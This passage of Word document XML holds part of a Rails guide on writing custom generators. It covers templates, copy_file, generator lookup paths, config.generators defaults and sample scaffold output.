      <w:r>
        <w:t xml:space="preserve">We can also see that our new generator has a class method called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>source_root</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This method points to where our generator templates will be placed, if any, and by default it points to the created directory </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/generators/initializer/templates</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BDB319" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In order to understand what a generator template means, let’s create the file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/generators/initializer/templates/initializer.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the following content:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="7BD41BE6" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C8CACF6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1696687989"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># Add initialization content here</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="133F5226" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And now let’s change the generator to copy this template when invoked:</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5D9938D8" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7F3F3E90" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>InitializerGenerator &lt; Rails::Generators::NamedBase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38501472" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  source_root File.expand_path("../templates", __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="732D363F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2887111D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>copy_initializer_file</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60A853AF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    copy_file "initializer.rb", "config/initializers/#{file_name}.rb"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="349F4BB9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E28C84E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A268E82" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And let’s execute our generator:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="75FD4086" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1435FB7A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1618099593"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate initializer core_extensions</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0FA14048" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We can see that now an initializer named core_extensions was created at </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/initializers/core_extensions.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with the contents of our template. That means that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>copy_file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> copied a file in our source root to the destination path we gave. The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>file_name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is automatically created when we inherit from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Rails::Generators::NamedBase</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382BB757" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods that are available for generators are covered in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId1154" w:anchor="generator-methods" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>final section</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> of this guide.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00254C64" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Generators Lookup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F04C41" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails generate initializer core_extensions</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Rails requires these files in turn until one is found:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="10232317" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AAA2EBB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rails/generators/initializer/initializer_generator.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DCFB159" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>generators/initializer/initializer_generator.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="43D36F02" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rails/generators/initializer_generator.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21568B1A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>generators/initializer_generator.rb</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F05D723" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If none is found you get an error message.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1B32E2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The examples above put files under the application’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because said directory belongs to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>$LOAD_PATH</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447BC16C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>5 Customizing Your Workflow</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB82459" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails own generators are flexible enough to let you customize scaffolding. They can be configured in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</w:t>
      </w:r>
      <w:r>
        <w:t>, these are some defaults:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="03BFEC8D" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="65575B8C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.generators do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="635FF54E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.orm             :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73529D4E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.template_engine :erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4369AFB9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.test_framework  :test_unit, :fixture</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="488725BF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="74E2A0BB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Before we customize our workflow, let’s first see what our scaffold looks like:</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543A0CBB" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="353D1906" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate scaffold User name:string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03F5D506" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke  active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="08F9F27E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    db/migrate/20091120125558_create_users.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77D87ECC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    app/models/user.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47854CB3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FDC3AC7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/unit/user_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EC7D6A3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/fixtures/users.yml</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7381E5BB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       route  resources :users</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="595731D1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke  scaffold_controller</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="011EF493" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    app/controllers/users_controller.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B99501F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63A368E3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EFBB794" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users/index.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69BE6229" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users/edit.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47C89DFA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users/show.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76616CEA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users/new.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="129C38D5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/views/users/_form.html.erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0E3D058B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="560A67E2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      test/functional/users_controller_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68402064" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke    helper</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F278D9E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create      app/helpers/users_helper.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B70D8D1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke      test_unit</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="233A8B7D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create        test/unit/helpers/users_helper_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="180611C8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      invoke  stylesheets</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BE4D131" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      create    app/assets/stylesheets/scaffold.css</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52074A28" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Looking at this output, it’s easy to understand how generators work in Rails 3.0 and above. The scaffold generator doesn’t actually generate anything, it just invokes others to do the work. This allows us to add/replace/remove any of those invocations. For instance, the scaffold generator invokes the scaffold_controller generator, which invokes erb, test_unit and helper generators. Since each generator has a single responsibility, they are easy to reuse, avoiding code duplication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB4D3C5" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Our first customization on the workflow will be to stop generating stylesheets and test fixtures for scaffolds. We can achieve that by changing our configuration to the following:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="6EEF0809" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="402D1458" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.generators do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|g|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C723D7A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.orm             :active_record</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="65AD2C10" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  g.template_engine :erb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F804B3D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
